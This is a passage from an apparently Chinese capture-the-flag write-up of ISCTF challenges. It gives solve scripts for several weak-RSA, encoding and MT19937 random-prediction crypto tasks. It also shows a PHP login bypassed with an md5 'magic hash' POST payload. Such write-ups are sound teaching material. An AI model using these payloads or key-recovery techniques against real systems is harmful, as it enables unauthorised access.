class="hljs-string">&quot;c2=&quot;</span>,c2)<br></code></pre></td></tr></table></figure><p>已知n,e=3，m对应的密文c1，(m+1)对应的密文c2。<br>直接硬化公式去解，脚本写着也方便：</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span>(<span class="hljs-params">a,b,c1,c2,n</span>):</span><br>    a3 = <span class="hljs-built_in">pow</span>(a,<span class="hljs-number">3</span>,n)<br>    b3 = <span class="hljs-built_in">pow</span>(b,<span class="hljs-number">3</span>,n)<br>    first = c1-a3*c2+<span class="hljs-number">2</span>*b3<br>    first = first % n<br>    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)<br>    second = second % n<br>    third = second*gmpy2.invert(first,n)<br>    third = third % n<br>    fourth = (third+b)*gmpy2.invert(a,n)<br>    <span class="hljs-keyword">return</span> fourth % n<br>a = <span class="hljs-number">1</span><br>b = -<span class="hljs-number">1</span><br>c1 = <span class="hljs-number">2472980534576281392558886476940549411151541741395435035178216067058424274579199860482131340986643214114691172763529231832373323600612645856564185998644266</span><br>c2 =<span class="hljs-number">3187049937811823373965320946136219840500070255491222077303817795527750241053576957767965313420456458983759851110615696314773380132732017115202532855996999</span><br>n = <span class="hljs-number">4204420773617479943564859167286821133009223627804172573263590117785622718525161236597233398439402100826272190957218464786259692632804955516979471884796171</span><br>m = a*getM2(a,b,c1,c2,n) + b<br>print(m)<br>flag = long_to_bytes(m)<br>print(flag)<br><br><br><br><span class="hljs-number">2627677351174352521228982698389418302338831226796241650558277555097107627042754252273675470990465824942973</span><br><span class="hljs-string">b&#x27;ISCTF&#123;U_n0w_kn0w_Related_information_attack&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Circular-Game"><a href="#Circular-Game" class="headerlink" title=" Circular Game"></a><a href="https://share.weiyun.com/ISvTkLqF"> </a>Circular Game</h2><p>维吉尼亚密码，解出来是yunnanuniversity，作为kz.zip的密码打开压缩包</p><p>cipher.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ cat cipher.txt    <br>Vt9T2BKcJR647T6jmomlLEt0WEDBXVfrk0/oSXLtOTRpZgKyyMo9jKbBByR3L5zuiqh31FbJ7Yb41D1VSU2y7biQNnaByDPj5FHr96hxEEupxRXPTgyoKUb1QCLU1YbpJvzUHPELPsBwyMnLBQxDCrid1mkJ4nP+ZcoI8UzXGlNGTJgYjOV1txv9/9UKsfvtdhrSuogyQ7dY/935bB/B6+3mWFX/XpN68O6vRJqwoY66fBQv+cp2xMY43hzs/7q+R10O3wz98s7BNQjgV4isGVWfp5yAgu2/DAj1Ww13zTthqCJ6XFrC4Jz+RiiLsqpxiB6HzOsd7YzJ3cWDHH1leA== <br></code></pre></td></tr></table></figure><p>public_key.pem </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ cat public_key.pem<br>-----BEGIN PUBLIC KEY-----<br>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ<br>71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXs<br>z9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsds<br>etnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpD<br>ffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+<br>7/i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAA<br>AQIDAQAB<br>-----END PUBLIC KEY----- <br></code></pre></td></tr></table></figure><p>攻防世界-Handicraft_RSA改编</p><p>提取公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/kz]<br>└─$ openssl rsa -pubin -text -modulus -<span class="hljs-keyword">in</span> warmup -<span class="hljs-keyword">in</span> public_key.pem<br>RSA Public-Key: (2048 bit)<br>Modulus:<br>    00:ab:e9:bb:88:7b:ab:05:af:46:f2:e8:c4:89:3a:<br>    59:ef:56:87:39:53:61:41:7a:5d:ea:30:90:36:1c:<br>    0c:37:78:43:e8:91:e4:bf:41:d2:c6:62:70:7c:67:<br>    b4:12:75:c3:b6:34:6b:69:69:92:e8:e6:33:4f:8f:<br>    8b:4a:b5:ec:cf:d2:24:58:6c:d1:94:9e:25:0b:b5:<br>    87:4b:c0:f7:35:62:16:60:70:8f:e1:34:6d:d8:dd:<br>    13:95:65:d6:9b:d9:c5:0a:b1:17:a9:0d:c8:5a:06:<br>    10:a5:0b:ca:ce:c7:6c:7a:d9:c8:64:92:f5:b5:fd:<br>    70:43:31:84:ea:b6:e4:6e:f5:11:95:40:5b:cc:14:<br>    ae:89:d9:26:8b:49:18:e5:0c:69:d8:97:db:e8:e5:<br>    08:eb:8e:f3:c7:67:4f:c4:9a:43:7d:f4:82:35:f7:<br>    d5:20:35:18:3a:fa:e0:63:12:21:b3:91:e6:08:5d:<br>    d7:10:20:b7:55:f6:8a:b5:17:1e:2f:92:4c:f1:1d:<br>    2a:cf:99:d5:53:63:6c:f2:13:ef:49:53:fe:ef:f8:<br>    bb:1b:8e:3b:72:35:b5:e7:5b:22:d2:3a:01:ed:1a:<br>    41:a6:5b:b8:e1:59:3c:4d:75:c3:02:4d:09:65:d5:<br>    ba:2b:02:67:ec:84:da:5f:4e:00:00:00:00:00:00:<br>    00:01<br>Exponent: 65537 (0x10001)<br>Modulus=ABE9BB887BAB05AF46F2E8C4893A59EF5687395361417A5DEA3090361C0C377843E891E4BF41D2C662707C67B41275C3B6346B696992E8E6334F8F8B4AB5ECCFD224586CD1949E250BB5874BC0F735621660708FE1346DD8DD139565D69BD9C50AB117A90DC85A0610A50BCACEC76C7AD9C86492F5B5FD70433184EAB6E46EF51195405BCC14AE89D9268B4918E50C69D897DBE8E508EB8EF3C7674FC49A437DF48235F7D52035183AFAE0631221B391E6085DD71020B755F68AB5171E2F924CF11D2ACF99D553636CF213EF4953FEEFF8BB1B8E3B7235B5E75B22D23A01ED1A41A65BB8E1593C4D75C3024D0965D5BA2B0267EC84DA5F4E0000000000000001<br>writing RSA key<br>-----BEGIN PUBLIC KEY-----<br>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ<br>71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXs<br>z9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsds<br>etnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpD<br>ffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+<br>7/i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAA<br>AQIDAQAB<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure><p>Modulus的值转换为十进制就是n，然后分解n得到p和q</p><p>exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">from Crypto.Util.number import *<br>from Crypto.PublicKey import RSA<br>import gmpy2<br>import base64<br><br><span class="hljs-comment">#pub = RSA.importKey(open(&#x27;public_key.pem&#x27;).read())</span><br><span class="hljs-comment">#n = pub.n</span><br><span class="hljs-comment">#e = pub.e</span><br><br>e=65537 <br>n=21702007965967851183912845012669844623756908507890324243024055496763943595946688940552416734878197459043831494232875785620294668737665396025897150541283087580428261036967329585399916163401369611036124501098728512558174430431806459204349427025717455575024289926516646738721697827263582054632714414433009171634156535642801472435174298248730890036345522414464312932752899972440365978028349224554681969090140541620264972373596402565696085035645624229615500129915303416150964709569033763686335344334340374467597281565279826664494938820964323794098815428802817709142950181265208976166531957235913949338642042322944000000001<br>p = 139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001<br>q = 155617827023249833340719354421664777126919280716316528121008762838820577123085292134385394346751341309377546683859340593439660968379640585296350265350950535158375685103003837903550191128377455111656903429282868722284520586387794090131818535032744071918282383650099890243578253423157468632973312000000000000001<br><br>d = gmpy2.invert(e,(p-1)*(q-1))<br><br>msg = base64.b64decode(<span class="hljs-string">&quot;Vt9T2BKcJR647T6jmomlLEt0WEDBXVfrk0/oSXLtOTRpZgKyyMo9jKbBByR3L5zuiqh31FbJ7Yb41D1VSU2y7biQNnaByDPj5FHr96hxEEupxRXPTgyoKUb1QCLU1YbpJvzUHPELPsBwyMnLBQxDCrid1mkJ4nP+ZcoI8UzXGlNGTJgYjOV1txv9/9UKsfvtdhrSuogyQ7dY/935bB/B6+3mWFX/XpN68O6vRJqwoY66fBQv+cp2xMY43hzs/7q+R10O3wz98s7BNQjgV4isGVWfp5yAgu2/DAj1Ww13zTthqCJ6XFrC4Jz+RiiLsqpxiB6HzOsd7YzJ3cWDHH1leA==&quot;</span>)<br>key = RSA.construct((int(n),int(e),int(d),int(p),int(q)))<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;for i in range(20):</span><br><span class="hljs-string">    enc = key.decrypt(msg)</span><br><span class="hljs-string">    msg = enc</span><br><span class="hljs-string">print(msg)</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>msg = bytes_to_long(msg)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(100):<br>    enc = pow(msg,d,n)<br>    msg = enc<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;ISCTF&quot;</span> <span class="hljs-keyword">in</span> long_to_bytes(msg):<br>        <span class="hljs-built_in">print</span>(long_to_bytes(msg))<br>       <br>  <br>  <br>b<span class="hljs-string">&#x27;ISCTF&#123;Cyc1ic_encrypt10n_4_y0u&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Do-u-know-coding"><a href="#Do-u-know-coding" class="headerlink" title="Do_u_know_coding"></a>Do_u_know_coding</h2><p>学校：福建师范大学</p><p>题目提示：</p><p>Base64 variation</p><p>5 levels in total</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">494n4n56453244524n464544475353534q4n5747343644524n5n4q5647544o32495634544o57434n4r563256455253484s464n584153434s47464r46455n3353494q59584o5n4o4r4o424r4755333253494646454q5344594r453q3q3q3q3q3q<br><br>ROT13：<br>494a4a56453244524a464544475353534d4a5747343644524a5a4d5647544b32495634544b57434a4e563256455253484f464a584153434f47464e46455a3353494d59584b5a4b4e4b424e4755333253494646454d5344594e453d3d3d3d3d3d<br><br>hex：<br>IJJVE2DRJFEDGSSSMJWG46DRJZMVGTK2IV4TKWCJNV2VERSHOFJXASCOGFNFEZ3SIMYXKZKNKBNGU32SIFFEMSDYNE======<br><br>Base32：<br>BSRhqIH3JRblnxqNYSMZEy5XImuRFGqSpHN1ZRgrC1ueMPZjoRAJFHxi<br><br>凯撒13<br>OFEudVU3WEoyakdALFZMRl5KVzhESTdFcUA1MEteP1hrZCMwbENWSUkv<br><br>Base64：<br>8Q.uU7XJ2jG@,VLF^JW8DI7Eq@50K^?Xkd<span class="hljs-comment">#0lCVII/</span><br><br>ASCII85解码：<br>ISCTF&#123;W0w_y0u_c4n_rea11y_c0d1ng!&#125;<br></code></pre></td></tr></table></figure><h2 id="RdEs"><a href="#RdEs" class="headerlink" title="RdEs"></a>RdEs</h2><p>出题人：YYGP</p><p>学校：大理大学</p><p>题目描述：前624都是不同的蓝鲨，你能知道第625个蓝鲨是什么吗？</p><p>看见生成624个随机数就简单了，mt19937随机数预测。<br>需要前624位进行预测，刚好在<code>output.txt</code>里面，直接套用脚本，跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br> <br>o = <span class="hljs-number">9999999999999999999999999999999999999999999999999999999999999</span><br><span class="hljs-comment"># right shift inverse</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inverse_right</span>(<span class="hljs-params">res, shift</span>):</span><br>    tmp = res<br>    bits=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &gt;&gt; shift<br>    <span class="hljs-keyword">return</span> tmp<br>  <br><span class="hljs-comment"># right shift with mask inverse</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inverse_right_mask</span>(<span class="hljs-params">res, shift, mask</span>):</span><br>    tmp = res<br>    bits=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &gt;&gt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br> <br><span class="hljs-comment"># left shift inverse</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inverse_left</span>(<span class="hljs-params">res, shift</span>):</span><br>    tmp = res<br>    bits=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &lt;&lt; shift<br>    <span class="hljs-keyword">return</span> tmp<br> <br><span class="hljs-comment"># left shift with mask inverse</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inverse_left_mask</span>(<span class="hljs-params">res, shift, mask</span>):</span><br>    tmp = res<br>    bits=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(res)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):<br>        tmp = res ^ tmp &lt;&lt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> tmp<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recover</span>(<span class="hljs-params">y</span>):</span><br>    y = inverse_right(y,<span class="hljs-number">18</span>)<br>    y = inverse_left_mask(y,<span class="hljs-number">15</span>,<span class="hljs-number">4022730752</span>)<br>    y = inverse_left_mask(y,<span class="hljs-number">7</span>,<span class="hljs-number">2636928640</span>)<br>    y = inverse_right(y,<span class="hljs-number">11</span>)<br>    <span class="hljs-keyword">return</span> y<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clone_mt</span>(<span class="hljs-params">record</span>):</span><br>    state = [recover(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> record]<br>    gen = Random()<br>    gen.setstate((<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>))<br>    <span class="hljs-keyword">return</span> gen<br> <br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;预测.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()<br>prng = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>    prng.append(<span class="hljs-built_in">int</span>(i.strip(<span class="hljs-string">&quot;\n&quot;</span>)))<br> <br>g = clone_mt(prng[:<span class="hljs-number">624</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">700</span>):<br>    g.getrandbits(<span class="hljs-number">32</span>)<br> <br>key = g.getrandbits(<span class="hljs-number">32</span>)<br>print(key)<br><span class="hljs-comment">#预测结果：3763948799</span><br></code></pre></td></tr></table></figure><p>跑出来就是这道题的 key<br>然后继续看剩下的 aes加密</p><p>脚本解密，直接得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_to_32</span>(<span class="hljs-params">value</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(value) % <span class="hljs-number">32</span> != <span class="hljs-number">0</span>:<br>        value += <span class="hljs-string">&#x27;\0&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>.encode(value)  <span class="hljs-comment"># 返回bytes</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_to_16</span>(<span class="hljs-params">value</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(value) % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>:<br>        value += <span class="hljs-string">&#x27;\0&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>.encode(value)  <span class="hljs-comment"># 返回bytes</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt_oralce</span>(<span class="hljs-params">text</span>):</span><br>    <span class="hljs-comment"># 秘钥</span><br>    key = <span class="hljs-string">&#x27;3763948799&#x27;</span><br>    <span class="hljs-comment"># 密文</span><br>    <span class="hljs-comment"># 初始化加密器</span><br>    aes = AES.new(add_to_16(key), AES.MODE_ECB)<br>    <span class="hljs-comment"># 优先逆向解密base64成bytes</span><br>    base64_decrypted = base64.decodebytes(text.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-comment"># 执行解密密并转码返回str</span><br>    decrypted_text = <span class="hljs-built_in">str</span>(aes.decrypt(base64_decrypted), encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;decrypted_text&#x27;</span>, decrypted_text)<br>    <span class="hljs-keyword">return</span> decrypted_text<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    text = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#x27;aaa&#x27;: &#x27;111&#x27;, &#x27;bbb&#x27;: &#x27;222&#x27;&#125;&#x27;&#x27;&#x27;</span><br><br>    decrypt_oralce(<span class="hljs-string">&quot;BYIlzaPnImGZeWVpn+QudBiZEwlaA3H3rl69STD8/tQ=&quot;</span>)<br></code></pre></td></tr></table></figure><p>flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;AE5_AnD_ranD0m&#125;<br></code></pre></td></tr></table></figure><h2 id="鲨米尔"><a href="#鲨米尔" class="headerlink" title="鲨米尔*"></a>鲨米尔*</h2><p>500</p><p>出题人：YYGP</p><p>学校：大理大学</p><p>题目描述：鲨米尔有5道门，好像我只需要知道3道就能进去了</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><p>出题人：0000FF</p><p>学校：大理大学</p><p>题目描述：js</p><p><a href="http://isctf.mcsog.tk:10004/">http://isctf.mcsog.tk:10004/</a></p><p>Ctrl+U查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- ISCTF&#123;mf_woDichaoRen!&#125; --&gt;<br> <br> 新flag：<br> &lt;!-- ISCTF&#123;885b0389-3d86-4c8b-8e95-846829ed6918&#125; --&gt;<br></code></pre></td></tr></table></figure><h2 id="粗心的小蓝鲨"><a href="#粗心的小蓝鲨" class="headerlink" title="粗心的小蓝鲨"></a>粗心的小蓝鲨</h2><p>出题人：f1@g</p><p>学校：河南理工大学</p><p>题目描述：粗心小蓝鲨忘记了他的账号密码,你能帮帮他吗？</p><p><a href="http://isctf.mcsog.tk:10000/">http://isctf.mcsog.tk:10000/</a></p><p>admin/123456登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>error_reporting(0);<br>    <span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]; <br>        <span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>];<br>        <span class="hljs-variable">$logined</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;XXXX&#x27;</span>;<br>        include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (!ctype_alpha(<span class="hljs-variable">$name</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>        <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$pwd</span>) ) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>        <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$name</span>) != md5(<span class="hljs-variable">$pwd</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$logined</span>)&#123;<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;&quot;</span>.<span class="hljs-string">&quot;login successful&quot;</span>.<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;&quot;</span>.<span class="hljs-string">&quot;Login failed&quot;</span>.<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>.<span class="hljs-string">&quot;The blue shark mocked you and threw a hint at you&quot;</span>.<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>;<br>            highlight_file(__FILE__);<br>        &#125;<br>    &#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>md5碰撞绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST： username=QNKCDZO&amp;password=240610708<br><br><br>ISCTF&#123;pHP_1s_ThE_6eST_1@n9V@Ge&#125;<br><br>新flag：<br>ISCTF&#123;acde1b6f-085d-4c5d-91f3-07ce8ff4ee95&#125;<br></code></pre></td></tr></table></figure><h2 id="小蜘蛛"><a href="#小蜘蛛" class="headerlink" title="小蜘蛛"></a>小蜘蛛</h2><p>出题人：啊罗小黑战记停更了</p><p>学校：焦作大学</p><p>题目描述：友仔友女们，你们喜欢小蜘蛛吗？ <a href="http://isctf.mcsog.tk:10002/">http://isctf.mcsog.tk:10002/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 